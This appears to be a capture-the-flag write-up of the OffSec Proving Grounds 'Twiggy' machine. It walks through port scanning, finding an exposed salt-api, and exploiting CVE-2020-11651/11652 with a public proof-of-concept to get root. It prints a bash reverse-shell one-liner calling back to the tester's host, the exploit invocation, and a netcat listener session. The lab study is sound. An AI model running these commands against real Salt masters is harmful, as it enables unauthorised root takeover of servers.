# Twiggy
>**Platform:** OffSec Proving Grounds Practice 
>**OS:** Linux  
>**Difficulty:** Intermediate  
>**IP:** `192.168.227.62`  
>**Status:** Rooted

---

## 📌 Overview

Twiggy is a Linux machine that exposes a **SaltStack** installation. Enumeration reveals Salt-related services on ports `4505`and `4506`, along with a `salt-api` service running on port `8000`.

The exposed SaltStack services are vulnerable to **CVE-2020-11651** and **CVE-2020-11652**, which allow unauthenticated access to sensitive Salt functions and ultimately enable **remote command execution as root**.

The attack path is:

```text
Nmap Enumeration
        ↓
Identify SaltStack
        ↓
Discover salt-api on port 8000
        ↓
Identify CVE-2020-11651 / CVE-2020-11652
        ↓
Obtain Salt master key
        ↓
Execute command on Salt master
        ↓
Reverse Shell
        ↓
Root
```

---

# 🔎 Enumeration

## Nmap

I started with a full TCP port scan with service and version detection:

```bash
sudo nmap -Pn -p- -sVC --min-rate 10000 192.168.227.62
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-10-04 15:46 -0400
Nmap scan report for 192.168.227.62
Host is up (0.068s latency).

Not shown: 65529 filtered tcp ports (no-response)

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey:
|   2048 44:7d:1a:56:9b:68:ae:f5:3b:f6:38:17:73:16:5d:75 (RSA)
|   256 1c:78:9d:83:81:52:f4:b0:1d:8e:32:03:cb:a6:18:93 (ECDSA)
|_  256 08:c9:12:d9:7b:98:98:c8:b3:99:7a:19:82:2e:a3:ea (ED25519)

53/tcp   open  domain  NLnet Labs NSD

80/tcp   open  http    nginx 1.16.1
|_http-title: Home | Mezzanine
|_http-server-header: nginx/1.16.1

4505/tcp open  zmtp    ZeroMQ ZMTP 2.0
4506/tcp open  zmtp    ZeroMQ ZMTP 2.0

8000/tcp open  http    nginx 1.16.1
|_http-title: Site doesn't have a title (application/json).
|_http-server-header: nginx/1.16.1
|_http-open-proxy: Proxy might be redirecting requests

Service detection performed. Please report any incorrect results at https://nmap.org/submit/.
Nmap done: 1 IP address (1 host up) scanned in 34.29 seconds
```

### Findings

|Port|Service|Version / Information|
|---|---|---|
|`22`|SSH|OpenSSH 7.4|
|`53`|DNS|NLnet Labs NSD|
|`80`|HTTP|nginx 1.16.1|
|`4505`|ZeroMQ|ZMTP 2.0|
|`4506`|ZeroMQ|ZMTP 2.0|
|`8000`|HTTP|nginx 1.16.1 / salt-api|

Port 80 is running a cms service named Mezzanine. I enumerated the web app further but found nothing useful so I started to focus on other ports
<img width="970" height="565" alt="Screenshot 2026-10-05 at 2 25 55 AM" src="https://github.com/user-attachments/assets/cc87751b-dd07-4820-8414-b10badc8cee5" />

after enumerating them I found that port 8000 is running salt api 
---

# 🧪 Salt API Enumeration

Requesting the root endpoint of port `8000`:

```bash
curl http://192.168.227.62:8000/ -v
```

The server returned:

```text
HTTP/1.1 200 OK
Server: nginx/1.16.1
Content-Type: application/json
X-Upstream: salt-api/3000-1
```

The response body was:

```json
{
  "clients": [
    "local",
    "local_async",
    "local_batch",
    "local_subset",
    "runner",
    "runner_async",
    "ssh",
    "wheel",
    "wheel_async"
  ],
  "return": "Welcome"
}
```

The important discovery here is:

```text
X-Upstream: salt-api/3000-1
```

This confirms that the service is exposing **Salt API**.

---

# 💥 Exploitation

## CVE-2020-11651 / CVE-2020-11652

With SaltStack identified, I investigated known vulnerabilities affecting the exposed Salt master.

The relevant vulnerabilities are:

- **CVE-2020-11651** — Authentication bypass / directory traversal vulnerability in Salt Master
    
- **CVE-2020-11652** — Improper validation of commands sent to the Salt Master, allowing command execution

## Obtaining Remote Command Execution

I used a public proof-of-concept for CVE-2020-11651 to interact with the Salt master.

First, I prepared a reverse shell payload:

```bash
bash -i >& /dev/tcp/192.168.45.213/80 0>&1
```

The exploit was then executed against the target:

```bash
python3 CVE-2020-11651.py 192.168.227.62 master \
'bash -i >& /dev/tcp/192.168.45.213/80 0>&1'
```

The exploit successfully retrieved the Salt master root key:

```text
Attempting to ping master at 192.168.227.62

Retrieved root key:
ESetO4U5zGl4KSxCmAcSSxuZ7eV4LqC1GaS+s2yTuXqhah/sq1Tdh/k7pT9mRq0IihgrezwtoCE=

Got response for attempting master shell:
{'jid': '20261004203555101828',
 'tag': 'salt/run/20261004203555101828'}

Looks promising!
```

The returned job ID indicated that the command had been accepted by the Salt master.

---

# 🐚 Reverse Shell

Initially, I attempted to receive the reverse shell on port 1337.
However, the callback did not arrive.
Instead of assuming that the exploit had failed, I changed the listener/payload to use port 80.
The reverse shell payload became:

``` bash
bash -i >& /dev/tcp/192.168.45.213/80 0>&1
```
I started a Netcat listener:
```
kali@kali ~/p/t/cve-2020-11651 (master) [1]> nc -lnvp 80
listening on [any] 80 ...
connect to [192.168.45.213] from (UNKNOWN) [192.168.227.62] 55780
bash: no job control in this shell
[root@twiggy root]# id
id
uid=0(root) gid=0(root) groups=0(root)

```

---

# 🧠 Methodology

The complete attack chain was:

```text
1. Full TCP enumeration
        ↓
2. Identify ports 4505/4506 as SaltStack-related
        ↓
3. Enumerate port 8000
        ↓
4. Identify salt-api
        ↓
5. Research SaltStack vulnerabilities
        ↓
6. Identify CVE-2020-11651 / CVE-2020-11652
        ↓
7. Exploit exposed Salt Master
        ↓
8. Obtain root key / execute Salt command
        ↓
9. Receive reverse shell
        ↓
10. Verify uid=0
        ↓
11. Read proof.txt
```

## Key Takeaways

- **Ports 4505 and 4506** are important indicators when enumerating SaltStack.
    
- Always investigate unusual API services exposed on non-standard HTTP ports.
    
- The `X-Upstream` HTTP header revealed the backend as **salt-api**.
    
- Known vulnerabilities can become directly exploitable when management interfaces are exposed without proper authentication.
    
- **CVE-2020-11651/CVE-2020-11652** can lead to complete compromise of a vulnerable Salt Master.
    

## Skills Demonstrated

```text
Network Enumeration
Service Identification
Web/API Enumeration
SaltStack Enumeration
Vulnerability Research
CVE Identification
Remote Code Execution
Reverse Shells
Linux Privilege Verification
Post-Exploitation
```
